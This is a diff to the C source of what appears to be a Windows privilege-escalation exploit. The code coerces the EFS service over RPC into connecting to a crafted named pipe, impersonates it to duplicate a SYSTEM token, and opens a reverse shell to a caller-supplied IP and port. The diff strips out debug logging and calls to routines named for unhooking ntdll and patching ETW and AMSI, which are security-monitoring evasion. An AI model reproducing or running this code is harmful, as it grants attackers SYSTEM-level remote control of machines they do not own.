@@ -9,39 +9,6 @@
 #include "util.h"
 #include <winsock2.h>
 
-// --- debug helpers (additive, do not change behaviour) -----------------
-static void __cdecl dbg(const char* fmt, ...) {
-    char buf[1024];
-    va_list ap; va_start(ap, fmt);
-    int n = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
-    va_end(ap);
-    if (n < 0) n = 0;
-    fflush(stdout);
-    fputs(buf, stdout);
-    fputs("\n", stdout);
-    fflush(stdout);
-    OutputDebugStringA(buf);
-    OutputDebugStringA("\n");
-}
-#define DBG(...) do { dbg("[DBG %s:%d] ", __FILE__, __LINE__); dbg(__VA_ARGS__); } while(0)
-
-static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* ep) {
-    char buf[512];
-    DWORD code = ep ? ep->ExceptionRecord->ExceptionCode : 0;
-    PVOID addr = ep ? ep->ExceptionRecord->ExceptionAddress : NULL;
-    PVOID rip  = (ep && ep->ContextRecord) ? (PVOID)ep->ContextRecord->Rip : NULL;
-    _snprintf_s(buf, sizeof(buf), _TRUNCATE,
-        "[CRASH] code=0x%lX addr=%p rip=%p thread=%lu",
-        code, addr, rip, GetCurrentThreadId());
-    OutputDebugStringA(buf);
-    OutputDebugStringA("\n");
-    fputs(buf, stderr);
-    fputs("\n", stderr);
-    fflush(stderr);
-    return EXCEPTION_EXECUTE_HANDLER;
-}
-// -----------------------------------------------------------------------
-
 void* __RPC_USER MIDL_user_allocate(size_t n) {
     return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
 }
@@ -117,13 +84,10 @@ static handle_t couch_bind(void) {
     if (st) { printf("[-] AuthInfo: %ld\n", st); RpcBindingFree(&bh); return NULL; }
 
     RpcBindingSetOption(bh, 12, 10000);
-    DBG("couch_bind: returning bh=%p", bh);
     return bh;
 }
 
 DWORD WINAPI efs_trigger(LPVOID param) {
-    DBG("efs_trigger: enter thread=%lu", GetCurrentThreadId());
-
     SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
     if (hSCM) {
         SC_HANDLE hSvc = OpenServiceA(hSCM, "EFS", SERVICE_START | SERVICE_QUERY_STATUS);
@@ -134,35 +98,30 @@ DWORD WINAPI efs_trigger(LPVOID param) {
         }
         CloseServiceHandle(hSCM);
     }
-    DBG("efs_trigger: efs service touched");
 
     handle_t ht = couch_bind();
-    if (!ht) { DBG("efs_trigger: couch_bind returned NULL"); return 1; }
-    DBG("efs_trigger: bound, calling EfsRpcQueryUsersOnFile");
+    if (!ht) return 1;
 
     long* pUsers = NULL;
-    RpcTryExcept{
+    RpcTryExcept {
         long result = EfsRpcQueryUsersOnFile(
             ht,
             L"\\\\localhost/pipe/CouchPotato\\C$\\couch.txt",
             &pUsers
         );
-        DBG("efs_trigger: EfsRpcQueryUsersOnFile result=%ld", result);
+        (void)result;
     }
         RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
         DWORD code = RpcExceptionCode();
-        DBG("efs_trigger: RPC exception code=0x%lX", code);
+        (void)code;
     }
     RpcEndExcept
 
-        DBG("efs_trigger: free binding");
     RpcBindingFree(&ht);
     return 0;
 }
 
 VOID efs_escalate(char* ip, char* port) {
-    __try {
-    DBG("efs_escalate: enter ip=%s port=%s", ip, port);
     HANDLE hpipe = CreateNamedPipeA(
         "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
         PIPE_ACCESS_DUPLEX,
@@ -171,21 +130,18 @@ VOID efs_escalate(char* ip, char* port) {
     if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
         printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
     }
-    DBG("efs_escalate: pipe ready hpipe=%p", hpipe);
 
     HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
     if (!hThread) {
         printf("[-] CreateThread: %lu\n", GetLastError());
         CloseHandle(hpipe); return;
     }
-    DBG("efs_escalate: trigger thread %lu started", GetThreadId(hThread));
 
     OVERLAPPED ov = { 0 };
     ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
     ConnectNamedPipe(hpipe, &ov);
 
     DWORD w = WaitForSingleObject(ov.hEvent, 15000);
-    DBG("efs_escalate: wait result=0x%08lX gle=%lu", w, GetLastError());
     WaitForSingleObject(hThread, 3000);
     CloseHandle(hThread);
     CloseHandle(ov.hEvent);
@@ -207,7 +163,6 @@ VOID efs_escalate(char* ip, char* port) {
         printf("[-] OpenThreadToken: %lu\n", GetLastError());
         RevertToSelf(); CloseHandle(hpipe); return;
     }
-    DBG("efs_escalate: h_ex=%p", h_ex);
 
     HANDLE h_new = NULL;
     if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
@@ -215,7 +170,6 @@ VOID efs_escalate(char* ip, char* port) {
         CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
     }
     printf("[+] SYSTEM token duplicated\n");
-    DBG("efs_escalate: h_new=%p", h_new);
 
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
@@ -224,9 +178,8 @@ VOID efs_escalate(char* ip, char* port) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(atoi(port));
     addr.sin_addr.s_addr = inet_addr(ip);
-    DBG("efs_escalate: connect -> ip=%s port=%d", ip, ntohs(addr.sin_port));
     int rc = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
-    DBG("efs_escalate: connect rc=%d gle=%lu", rc, GetLastError());
+    (void)rc;
     SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
 
     STARTUPINFOW si = { sizeof(STARTUPINFOW) };
@@ -245,7 +198,6 @@ VOID efs_escalate(char* ip, char* port) {
     }
     else {
         printf("[+] SYSTEM shell spawned\n");
-
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -254,20 +206,13 @@ VOID efs_escalate(char* ip, char* port) {
     CloseHandle(h_ex);
     closesocket(sock);
     WSACleanup();
-    } __except (CrashHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
-        DBG("efs_escalate: EXCEPTION swallowed, exiting");
-        return;
-    }
 }
 
 int main(void) {
-    // Force unbuffered stdout, install top-level crash handler
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
-    SetUnhandledExceptionFilter(CrashHandler);
 
     LPSTR cmd = GetCommandLineA();
-    DBG("argc scan: cmd=[%s]", cmd);
     BOOL q = FALSE; DWORD p = 0;
     while (cmd[p]) {
         if (cmd[p] == '"') q = !q;
@@ -282,22 +227,7 @@ int main(void) {
     char ip[16] = { 0 }, port[6] = { 0 };
     strncpy(ip, a, s - a);
     strcpy(port, s + 1);
-    DBG("parsed ip=[%s] port=[%s] ip_len=%lu", ip, port, (unsigned long)(s-a));
 
-    __try {
-        DBG(">> unhook_Ntdll (no-op)");
-        unhook_Ntdll();
-        DBG(">> EtwPatch (no-op)");
-        EtwPatch();
-        DBG(">> AmsiPatch (no-op)");
-        AmsiPatch();
-        DBG(">> efs_escalate");
-        efs_escalate(ip, port);
-        DBG(">> efs_escalate returned");
-    } __except (CrashHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
-        DBG("EXCEPTION swallowed, exiting");
-        return 99;
-    }
-
+    efs_escalate(ip, port);
     return 0;
 }
